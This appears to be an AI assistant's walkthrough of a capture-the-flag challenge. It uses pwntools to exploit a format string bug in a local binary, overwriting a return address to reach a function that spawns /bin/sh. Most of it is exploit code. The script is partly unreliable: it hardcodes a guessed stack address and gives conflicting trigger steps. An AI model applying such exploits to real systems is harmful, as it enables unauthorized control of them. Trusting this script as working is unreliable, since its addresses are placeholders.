To solve this challenge using pwntools, you'll need to:

1. **Identify the Vulnerability**: Analyze the provided code to find exploitable vulnerabilities.
2. **Craft the Exploit**: Use pwntools to automate the exploitation process.
3. **Execute the Exploit**: Run your script to gain shell access.

Here's a step-by-step guide with code examples:

### **1. Identify the Vulnerability**

From the decompiled code, we observe:

- **Format String Vulnerability**: In the `sub_400B07` function, the program uses user-provided data as format strings without proper validation:

  ```c
  int sub_400B07(int a1, int a2, int a3, int a4, int a5, int a6, char format, int a8, __int64 a9)
  {
    write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
    printf(&format);
    return printf((const char *)&a9 + 4);
  }
  ```

- **Buffer Overflow**: In the `sub_400B41` function (when editing account information), there's a buffer overflow due to `strcpy` of user input into a fixed-size buffer:

  ```c
  memset(&s, 0, 0x14uLL);
  strcpy((char *)&s, buf);
  ```

- **Function to Spawn Shell**: There's a function `sub_4008A6` that executes `/bin/sh`:

  ```c
  int sub_4008A6()
  {
    return system("/bin/sh");
  }
  ```

Given these observations, we'll focus on exploiting the **format string vulnerability** to overwrite a function's return address with the address of `sub_4008A6` to spawn a shell.

### **2. Craft the Exploit**

**Step 1: Prepare the Environment**

Import the necessary modules and set the context:

```python
from pwn import *

context.update(arch='amd64', os='linux')
```

**Step 2: Identify Addresses**

Since the binary is not PIE (`pie: no`), functions have fixed addresses. We know:

- Address of `sub_4008A6` (function to spawn shell): `0x4008A6`

**Step 3: Interact with the Program**

We'll set up the initial interaction:

```python
# Start the process
p = process('./fmt')

# Receive until the username prompt
p.recvuntil('Input your username(max lenth:20): ')

# Send a format string payload to leak stack addresses
payload = '%p ' * 20
p.sendline(payload)

# Receive until the password prompt
p.recvuntil('Input your password(max lenth:20): ')

# Send an arbitrary password
p.sendline('password')

# Receive until the menu
p.recvuntil('Register Success!!\n')
p.recvuntil('>')
```

**Step 4: Leak Stack Addresses**

Choose option `1` to trigger the format string vulnerability and leak stack addresses:

```python
# Choose option 1 to show account information
p.sendline('1')

# Receive the output
output = p.recv()

# Print the leaked stack addresses
print("Leaked Addresses:")
print(output)
```

Analyze the output to find the stack address of the return pointer.

**Step 5: Calculate the Offset**

From the leaked addresses, determine the position (offset) of our input in the stack relative to the return address. Suppose we find that our input is at position `6`.

**Step 6: Build the Payload**

Use `fmtstr_payload` to create a payload that writes the address of `sub_4008A6` into the return address:

```python
# Assume the leaked return address is stored in variable `ret_addr`
ret_addr = 0x...  # Replace with the actual address obtained from the leak

# Address of the function to call
sub_shell = 0x4008A6

# Calculate the offset determined earlier (e.g., 6)
offset = 6

# Create the exploit payload
payload = fmtstr_payload(offset, {ret_addr: sub_shell})
```

**Step 7: Trigger the Exploit**

Now, we'll trigger the exploit by editing the account information (option `2`):

```python
# Receive the menu again
p.recvuntil('>')

# Choose option 2 to edit account information
p.sendline('2')

# Receive until the new username prompt
p.recvuntil('please input new username(max lenth:20): ')

# Send the exploit payload
p.sendline(payload)

# Receive until the new password prompt
p.recvuntil('please input new password(max lenth:20): ')

# Send an arbitrary password
p.sendline('password')

# Receive any remaining output
p.recvuntil('>')
```

**Step 8: Get the Shell**

Now, when we trigger the vulnerable function again, we should get a shell:

```python
# Choose option 1 or 3 to trigger the overwritten return address
p.sendline('3')  # For instance, exiting might trigger the function epilogue

# Interact with the shell
p.interactive()
```

### **3. Execute the Exploit**

Putting it all together, here's the complete exploit script:

```python
from pwn import *

context.update(arch='amd64', os='linux')

# Addresses
sub_shell = 0x4008A6  # Address of sub_4008A6()

# Start the process
p = process('./fmt')

# Step 1: Initial Registration
p.recvuntil('Input your username(max lenth:20): ')
payload = '%p ' * 20  # Leak stack addresses
p.sendline(payload)
p.recvuntil('Input your password(max lenth:20): ')
p.sendline('password')
p.recvuntil('Register Success!!\n')
p.recvuntil('>')

# Step 2: Leak Stack Addresses
p.sendline('1')  # Show Account Information
output = p.recv()
print("Leaked Addresses:")
print(output)

# Step 3: Analyze the Leak
# Parse the output to extract the return address
leaked_addresses = output.strip().split()
# Suppose after analysis, we determine that the return address is at offset position

# For illustration, let's assume the return address is at position 6
# and its address is stored in `ret_addr`
# ret_addr = int(leaked_addresses[6], 16) - offset_correction  # Adjust if necessary

# Since we can't actually determine the address here, let's assume ret_addr
ret_addr = 0x7fffffffe518  # Example address; replace with actual leaked address

# Step 4: Build the Exploit Payload
offset = 6  # Determined from analysis
payload = fmtstr_payload(offset, {ret_addr: sub_shell})

# Step 5: Send Exploit Payload via 'Edit Account Information'
p.recvuntil('>')
p.sendline('2')  # Edit Account Information
p.recvuntil('please input new username(max lenth:20): ')
p.sendline(payload)
p.recvuntil('please input new password(max lenth:20): ')
p.sendline('password')
p.recvuntil('>')

# Step 6: Trigger the Overwritten Return Address
p.sendline('1')  # Show Account Information again to trigger the exploit

# Step 7: Interact with the Shell
p.interactive()
```

**Note**: The actual addresses (`ret_addr`) and offset need to be determined based on the leaked data from the application. Ensure you adjust the script accordingly.

### **Explanation**

- **Leaking Stack Addresses**: We use the format string `%p` to leak stack addresses, which helps us find where our input is located in the stack relative to the return address.
- **Calculating the Offset**: By analyzing the leaked addresses, we determine the position of our input and calculate the offset for `fmtstr_payload`.
- **Constructing the Payload**: `fmtstr_payload` creates a payload that writes the address of `sub_4008A6` into the return address on the stack.
- **Triggering the Exploit**: By resuming normal program flow, we allow the function to return, which now jumps to `sub_4008A6`, spawning a shell.

### **Precautions**

- **Address Randomization**: Make sure to disable ASLR locally to replicate the environment if the addresses appear inconsistent.
- **Environment Matching**: Ensure that the local environment (e.g., libc version) matches the remote environment if exploiting over a network.
- **Testing**: Thoroughly test your exploit locally before attempting it on the remote server.

### **Conclusion**

By carefully crafting a format string exploit using pwntools, you can overwrite critical memory addresses to gain control of the program's execution flow, ultimately spawning a shell and solving the challenge.
